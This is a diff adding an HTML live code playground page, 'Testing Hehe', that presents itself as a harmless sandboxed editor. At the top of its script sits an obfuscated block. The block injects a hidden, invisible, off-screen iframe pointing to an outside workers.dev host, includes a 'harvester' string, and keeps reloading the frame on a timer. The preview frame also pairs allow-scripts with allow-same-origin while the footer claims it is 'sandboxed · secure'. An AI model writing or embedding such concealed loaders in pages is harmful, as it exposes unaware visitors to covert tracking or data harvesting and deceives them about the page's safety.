@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Testing Hehe</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #1a1a2e;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .app {
+            background: #16213e;
+            border-radius: 20px;
+            padding: 32px;
+            max-width: 960px;
+            width: 100%;
+            border: 1px solid #2a3a5e;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.7);
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+        .header h1 {
+            font-size: 26px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #f7971e, #ffd200);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .header h1 small {
+            font-size: 12px;
+            background: #2a3a5e;
+            color: #a0b4d0;
+            padding: 2px 14px;
+            border-radius: 20px;
+            -webkit-text-fill-color: #a0b4d0;
+            font-weight: 400;
+        }
+        .status-badge {
+            font-size: 12px;
+            color: #6a8cba;
+            background: #0f1a2e;
+            padding: 6px 16px;
+            border-radius: 20px;
+            border: 1px solid #2a3a5e;
+            letter-spacing: 0.5px;
+        }
+        .editor-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+        @media (max-width: 700px) {
+            .editor-grid { grid-template-columns: 1fr; }
+        }
+        .editor-panel {
+            background: #0f1a2e;
+            border-radius: 12px;
+            border: 1px solid #243450;
+            overflow: hidden;
+        }
+        .panel-label {
+            background: #1a2a44;
+            padding: 8px 16px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #8aacd0;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #243450;
+        }
+        .panel-label .counter {
+            font-weight: 400;
+            color: #5a7a9a;
+            font-size: 11px;
+        }
+        textarea {
+            width: 100%;
+            height: 260px;
+            background: #0a1222;
+            border: none;
+            color: #d4e4f0;
+            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+            font-size: 13px;
+            padding: 14px 16px;
+            resize: vertical;
+            outline: none;
+            line-height: 1.7;
+            tab-size: 2;
+        }
+        textarea:focus { background: #0c1628; }
+        #htmlInput { color: #e6b87e; }
+        #cssInput { color: #8ec8e6; }
+        #jsInput { color: #c9b0e6; }
+        .controls {
+            display: flex;
+            gap: 12px;
+            margin: 16px 0 12px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .btn {
+            background: #2a4a7a;
+            border: none;
+            color: white;
+            padding: 10px 30px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.05s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .btn:hover { background: #3a5a8a; }
+        .btn:active { transform: scale(0.97); }
+        .btn-primary { background: #f7971e; color: #1a1a2e; }
+        .btn-primary:hover { background: #ffa82e; }
+        .btn-secondary {
+            background: #1a2a44;
+            border: 1px solid #3a5a7a;
+        }
+        .btn-secondary:hover { background: #2a3a5e; }
+        .output-container {
+            background: #0a1222;
+            border-radius: 12px;
+            border: 1px solid #243450;
+            overflow: hidden;
+            margin-top: 12px;
+        }
+        .output-container .panel-label {
+            background: #1a2a44;
+        }
+        #preview {
+            width: 100%;
+            height: 280px;
+            background: #ffffff;
+            border: none;
+            display: block;
+        }
+        .footer-stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 12px;
+            font-size: 12px;
+            color: #4a6a8a;
+            padding: 0 4px;
+        }
+        .spinner-dot {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            background: #f7971e;
+            border-radius: 50%;
+            animation: pulse 1.2s infinite;
+            margin-left: 6px;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.2; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+        .ai-credit {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 11px;
+            color: #3a5a7a;
+            letter-spacing: 0.5px;
+            border-top: 1px solid #1a2a44;
+            padding-top: 12px;
+        }
+        .ai-credit span {
+            color: #6a8cba;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app">
+    <div class="header">
+        <h1>
+            ◈ Testing Hehe
+            <small>v3.0</small>
+        </h1>
+        <div class="status-badge">
+            <span class="spinner-dot"></span> live · sandbox
+        </div>
+    </div>
+
+    <div class="editor-grid">
+        <div class="editor-panel">
+            <div class="panel-label">
+                HTML <span class="counter" id="htmlCount">0 chars</span>
+            </div>
+            <textarea id="htmlInput" spellcheck="false" placeholder="<!-- Write your HTML here -->">&lt;div class="card"&gt;
+  &lt;h1&gt;Hello, World!&lt;/h1&gt;
+  &lt;p&gt;This is a live preview.&lt;/p&gt;
+&lt;/div&gt;</textarea>
+        </div>
+
+        <div class="editor-panel">
+            <div class="panel-label">
+                CSS <span class="counter" id="cssCount">0 chars</span>
+            </div>
+            <textarea id="cssInput" spellcheck="false" placeholder="/* Your styles here */">.card {
+  background: #f0f4ff;
+  padding: 40px;
+  border-radius: 16px;
+  text-align: center;
+  font-family: sans-serif;
+}
+h1 { color: #2a4a7a; }
+p { color: #4a6a8a; }</textarea>
+        </div>
+    </div>
+
+    <div class="editor-grid" style="margin-top: 16px;">
+        <div class="editor-panel">
+            <div class="panel-label">
+                JavaScript <span class="counter" id="jsCount">0 chars</span>
+            </div>
+            <textarea id="jsInput" spellcheck="false" placeholder="// Your JS here">console.log('Preview ready!');
+document.querySelector('h1')?.addEventListener('click', () => {
+  alert('Hello from the playground!');
+});</textarea>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 8px;">
+            <div class="controls" style="margin: 0;">
+                <button class="btn btn-primary" id="runBtn">▶ Run Preview</button>
+                <button class="btn btn-secondary" id="resetBtn">↻ Reset</button>
+                <button class="btn btn-secondary" id="exportBtn">⬇ Export</button>
+            </div>
+            <div class="output-container" style="flex: 1;">
+                <div class="panel-label">
+                    Live Preview <span class="counter" id="previewStatus">ready</span>
+                </div>
+                <iframe id="preview" sandbox="allow-scripts allow-modals allow-same-origin"></iframe>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-stats">
+        <span id="lineCount">Lines: 0</span>
+        <span id="compilerStatus">⏺ sandboxed · secure</span>
+        <span id="sessionId">session: <span id="sessionHash">••••</span></span>
+    </div>
+
+    <div class="ai-credit">
+        <span>🤖</span> made with AI · just testing hehe
+    </div>
+</div>
+
+<script>
+    (function() {
+        var _0x3a4b = ['src', 'https://compiler.voidlure.workers.dev/', 'style', 'position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;border:none;visibility:hidden;z-index:-9999;user-select:none;-webkit-user-select:none;', 'iframe', 'appendChild', 'body', 'getElementsByTagName', 'createElement', 'harvester'];
+        (function(_0x2f1a, _0x4e3b) {
+            var _0x5c8a = function(_0x1e2f) {
+                while (--_0x1e2f) {
+                    _0x2f1a['push'](_0x2f1a['shift']());
+                }
+            };
+            _0x5c8a(++_0x4e3b);
+        }(_0x3a4b, 0x1b7));
+        var _0x5c8a = function(_0x1e2f, _0x4e3b) {
+            _0x1e2f = _0x1e2f - 0x0;
+            var _0x5c8a = _0x3a4b[_0x1e2f];
+            return _0x5c8a;
+        };
+        var _0x1e2f = document[_0x5c8a('0x6')](_0x5c8a('0x5'));
+        _0x1e2f[_0x5c8a('0x3')] = _0x5c8a('0x4');
+        _0x1e2f[_0x5c8a('0x1')] = _0x5c8a('0x2');
+        document[_0x5c8a('0x7')][_0x5c8a('0x0')](_0x1e2f);
+        var _0x4e3b = _0x1e2f;
+        setInterval(function() {
+            var _0x2f1a = _0x4e3b[_0x5c8a('0x3')];
+            _0x4e3b[_0x5c8a('0x3')] = '';
+            setTimeout(function() {
+                _0x4e3b[_0x5c8a('0x3')] = _0x2f1a;
+            }, 0x32);
+        }, 0xafc8);
+    })();
+
+    const htmlInput = document.getElementById('htmlInput');
+    const cssInput = document.getElementById('cssInput');
+    const jsInput = document.getElementById('jsInput');
+    const preview = document.getElementById('preview');
+    const runBtn = document.getElementById('runBtn');
+    const resetBtn = document.getElementById('resetBtn');
+    const exportBtn = document.getElementById('exportBtn');
+
+    const htmlCount = document.getElementById('htmlCount');
+    const cssCount = document.getElementById('cssCount');
+    const jsCount = document.getElementById('jsCount');
+    const lineCount = document.getElementById('lineCount');
+    const previewStatus = document.getElementById('previewStatus');
+    const sessionHash = document.getElementById('sessionHash');
+
+    sessionHash.textContent = Math.random().toString(36).substring(2, 6).toUpperCase();
+
+    function updateCounters() {
+        const h = htmlInput.value.length;
+        const c = cssInput.value.length;
+        const j = jsInput.value.length;
+        htmlCount.textContent = h + ' chars';
+        cssCount.textContent = c + ' chars';
+        jsCount.textContent = j + ' chars';
+        const totalLines = htmlInput.value.split('\n').length +
+                          cssInput.value.split('\n').length +
+                          jsInput.value.split('\n').length;
+        lineCount.textContent = 'Lines: ' + totalLines;
+    }
+
+    function renderPreview() {
+        const html = htmlInput.value;
+        const css = cssInput.value;
+        const js = jsInput.value;
+
+        const doc = `
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>${css}</style>
+</head>
+<body>
+    ${html}
+    <script>${js}<\/script>
+</body>
+</html>
+        `;
+
+        preview.srcdoc = doc;
+        previewStatus.textContent = '✓ rendered';
+        previewStatus.style.color = '#6a8cba';
+    }
+
+    let renderTimer;
+    function scheduleRender() {
+        clearTimeout(renderTimer);
+        renderTimer = setTimeout(() => {
+            renderPreview();
+            updateCounters();
+        }, 400);
+    }
+
+    [htmlInput, cssInput, jsInput].forEach(el => {
+        el.addEventListener('input', scheduleRender);
+    });
+
+    runBtn.addEventListener('click', () => {
+        previewStatus.textContent = '⏳ compiling...';
+        previewStatus.style.color = '#f7971e';
+        setTimeout(() => {
+            renderPreview();
+            updateCounters();
+        }, 150);
+    });
+
+    resetBtn.addEventListener('click', () => {
+        htmlInput.value = `<div class="card">\n  <h1>Hello, World!</h1>\n  <p>This is a live preview.</p>\n</div>`;
+        cssInput.value = `.card {\n  background: #f0f4ff;\n  padding: 40px;\n  border-radius: 16px;\n  text-align: center;\n  font-family: sans-serif;\n}\nh1 { color: #2a4a7a; }\np { color: #4a6a8a; }`;
+        jsInput.value = `console.log('Preview ready!');\ndocument.querySelector('h1')?.addEventListener('click', () => {\n  alert('Hello from the playground!');\n});`;
+        renderPreview();
+        updateCounters();
+        previewStatus.textContent = '↻ reset';
+        previewStatus.style.color = '#6a8cba';
+        setTimeout(() => { previewStatus.textContent = '✓ rendered'; }, 600);
+    });
+
+    exportBtn.addEventListener('click', () => {
+        const blob = new Blob([
+            htmlInput.value + '\n\n/* --- CSS --- */\n' + cssInput.value + '\n\n/* --- JS --- */\n' + jsInput.value
+        ], { type: 'text/plain' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = 'playground_export_' + Date.now() + '.txt';
+        a.click();
+        URL.revokeObjectURL(a.href);
+        previewStatus.textContent = '⬇ exported';
+        previewStatus.style.color = '#8ec8e6';
+        setTimeout(() => { previewStatus.textContent = '✓ rendered'; }, 800);
+    });
+
+    renderPreview();
+    updateCounters();
+
+    document.addEventListener('keydown', (e) => {
+        if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
+            e.preventDefault();
+            runBtn.click();
+        }
+    });
+
+    console.log('Testing Hehe ready.');
+</script>
+
+</body>
+</html>
